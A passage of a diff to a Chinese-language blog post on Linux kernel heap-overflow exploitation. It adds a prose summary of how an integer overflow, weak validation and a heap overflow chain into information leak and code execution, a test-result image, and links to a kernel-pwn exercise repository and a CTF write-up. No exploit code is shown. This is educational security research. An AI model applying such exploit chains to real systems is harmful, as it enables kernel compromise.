+| **复杂度**     | 相对较低                      | 较高，需协调两个阶段的堆布局                             |
+
+### 5-8. 技术总结
+
+本技术链深刻揭示了多个独立问题（整数溢出、堆溢出、验证不严）组合后产生的级联效应。整数溢出创造了异常的小对象分配条件；不充分的验证允许异常状态持续；堆溢出则提供了将特定数据写入相邻内存的能力。这些问题相互配合，共同构成了从内存破坏到信息泄露，再到代码执行的完整路径。本技术链是对复杂内核漏洞条件进行组合利用的一次综合演示。它不仅仅是一个具体漏洞的利用程序，更是一个理解现代Linux内核内存管理机制、各子系统交互细节以及如何绕过层层防护的绝佳研究案例。通过深入分析此类多阶段、多技术的利用链，可以更深刻地理解内核安全的威胁模型，认识到在设计、实现、配置和维护等全生命周期中贯彻深度防御安全原则的极端重要性。
+
+### 5-9. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/HeapOverflow/HeapOverflow_002.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 https://github.com/BinRacer/pwn4kernel/tree/master/src/HeapOverflow2
+https://github.com/BinRacer/pwn4kernel/tree/master/src/HeapOverflow3
 https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#例题：InCTF2021-Kqueue
